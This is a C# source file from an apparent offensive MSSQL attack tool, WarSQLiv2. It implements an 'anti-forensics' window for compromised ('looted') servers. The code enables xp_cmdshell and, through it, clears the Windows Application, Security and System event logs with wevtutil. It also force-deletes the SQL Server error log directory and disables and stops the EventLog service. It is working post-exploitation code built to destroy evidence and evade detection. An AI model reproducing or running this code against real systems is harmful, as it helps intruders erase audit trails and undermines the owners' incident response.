using System;
using System.Collections.Generic;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Threading;
using WarSQLiv2.Exploitation.Control;
using WarSQLiv2.Exploitation.PostExploitation;

namespace WarSQLiv2.UserControls.Attack.MSSQL
{
    /// <summary>
    /// Interaction logic for FrmAntiForensics.xaml
    /// </summary>
    public partial class FrmAntiForensics : Window
    {
        private readonly LanguageControl _languageControl = new LanguageControl();
        public xpCmdShellControl cmdControl = new xpCmdShellControl();
        readonly MsSqlPostExploitation _postExploitation = new MsSqlPostExploitation();
        private int _selectedId = 0;
        public FrmAntiForensics()
        {
            InitializeComponent();
        }
        private void FrmAntiForensics_OnLoaded(object sender, RoutedEventArgs e)
        {
            _languageControl.FindLang();
            var lootedFileControl = new LootedFileControl();
            try
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    btnGet.Content = _languageControl.SelectedLanguage.GetString("ButtonForensics");
                    cbi1.Content = _languageControl.SelectedLanguage.GetString("ComboBoxClearLog");
                    cbi2.Content = _languageControl.SelectedLanguage.GetString("ComboBoxClearMssqlLog");
                    cbi3.Content = _languageControl.SelectedLanguage.GetString("ComboBoxStopWinEvent");
                    Title = _languageControl.SelectedLanguage.GetString("TitleAntiForensics");
                    lootedFileControl.FileControl();
                    var lootedList = lootedFileControl.LootedList;
                    foreach (var t in lootedList)
                    {
                        lstLooted.Items.Add(t);
                    }

                    lstLooted.SelectedIndex = 0;
                    var toolStripControl = new ToolStripInformation
                    {
                        SelectedLootedServer = lstLooted.SelectedItem.ToString(),
                        Command = "sp_server_info",
                    };
                    toolStripControl.SqlServerInformation();
                    lblStrip.Content = string.Empty;
                    lblStrip.Content = toolStripControl.SqlServerInfo;
                });

            }
            catch (Exception exp)
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText(lootedFileControl.Exception);
                });
            }
        }
        private void LstLooted_OnSelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            try
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    _selectedId = 0;
                    _selectedId = lstLooted.SelectedIndex;
                    lblStrip.Content = string.Empty;
                    var toolStripControl = new ToolStripInformation
                    {
                        SelectedLootedServer = lstLooted.SelectedItem.ToString(),
                        Command = "sp_server_info",
                    };
                    toolStripControl.SqlServerInformation();
                    lblStrip.Content = toolStripControl.SqlServerInfo;
                });

            }
            catch (Exception exp)
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                });

            }
        }
        private void BtnGet_OnClick(object sender, RoutedEventArgs e)
        {
            var isActivated = cmdControl.isActivated;
            var isExecuted = cmdControl.isExecuted;
            if (isActivated == false && isExecuted == false)
            {
                var enableXpCmdShell = new EnableXpCmdShell { LootedServer = lstLooted.SelectedItem.ToString() };
                try
                {
                    enableXpCmdShell.XpCmdShellStatus();
                    txtStatus.AppendText(enableXpCmdShell.Result);
                    var cmdLandResult = _languageControl.SelectedLanguage.GetString("XPCmdShell2");
                    var contains = enableXpCmdShell.Result.Contains(cmdLandResult);
                    if (contains == true)
                    {
                        isActivated = true;
                        isExecuted = true;
                    }
                }
                catch (Exception)
                {
                    txtStatus.AppendText(enableXpCmdShell.CmdException);
                }
            }
            if (isExecuted == true && isActivated == true)
            {
                if (cmbEnumeration.SelectedIndex == 0)
                {
                    try
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action) delegate
                        {
                            var exploitCode = string.Empty;
                            var eventNameList = new List<string> { "Application", "Security", "System" };
                            for (var i = 0; i < eventNameList.Count; i++)
                            {
                                exploitCode = string.Empty;
                                exploitCode += "USE [master]\r\n";
                                exploitCode += "EXEC xp_cmdshell '\"wevtutil clear-log " + eventNameList[i] + "\"';\r\n";
                                txtStatus.AppendText($"{Environment.NewLine}{eventNameList[i]} {_languageControl.SelectedLanguage.GetString("ExploitClearLog1")}");
                                _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                                _postExploitation.ExploitCode = exploitCode;
                                _postExploitation.RunExploit();
                                txtStatus.AppendText(_postExploitation.ExploitResult.Replace("\r","").Replace("\n",""));
                            }
                            txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("ExploitClearLog2")}");
                        });
                    }
                    catch (Exception exp)
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action) delegate
                        {
                            txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message,
                                _languageControl.SelectedLanguage.GetString("GeneralError1"),
                                _languageControl.SelectedLanguage.GetString("GeneralError2")));
                        });
                    }
                }
                else if (cmbEnumeration.SelectedIndex == 1)
                {
                    try
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action) delegate
                        {
                            var exploitCode = string.Empty;
                            var directory = string.Empty;
                            exploitCode = "sp_readerrorlog";
                            _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                            _postExploitation.ExploitCode = exploitCode;
                            _postExploitation.ShowLogDirectory();
                            if (_postExploitation._msSqlLogDirectoryList.Count > 8)
                            {
                                directory = _postExploitation._msSqlLogDirectoryList[6];
                            }
                            txtStatus.AppendText(_postExploitation.ExploitResult);

                            var dirPars = directory.Trim().Split('\'');
                            var dirLocation = dirPars[1].Trim().Substring(0, dirPars[1].Length - 8);
                            exploitCode = string.Empty;
                            exploitCode += "USE [master]\r\n";
                            exploitCode += "EXEC xp_cmdshell '\"DEL /F /S /A \"" + dirLocation + "*.*\" ';\r\n";
                            _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                            _postExploitation.ExploitCode = exploitCode;
                            _postExploitation.RunExploit();
                            txtStatus.AppendText(_postExploitation.ExploitResult);
                        });
                    }
                    catch (Exception exp)
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action) delegate
                        {
                            txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message,
                                _languageControl.SelectedLanguage.GetString("GeneralError1"),
                                _languageControl.SelectedLanguage.GetString("GeneralError2")));
                        });
                    }
                }
                else
                {
                    try
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            var exploitCode = string.Empty;
                            exploitCode = string.Empty;
                            exploitCode += "USE [master]\r\n";
                            exploitCode += "EXEC xp_cmdshell '\"sc config \"EventLog\" start=disabled\"';\r\n";
                            txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("ExploitEventLog1")}");
                            exploitCode += "EXEC xp_cmdshell '\"net stop EventLog\"';\r\n";
                            txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("ExploitEventLog2")}");
                            
                            _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                            _postExploitation.ExploitCode = exploitCode;
                            _postExploitation.RunExploit();
                            txtStatus.AppendText(_postExploitation.ExploitResult);
                        });
                    }
                    catch (Exception exp)
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message,
                                _languageControl.SelectedLanguage.GetString("GeneralError1"),
                                _languageControl.SelectedLanguage.GetString("GeneralError2")));
                        });
                    }
                }
            }
        }
    }
}
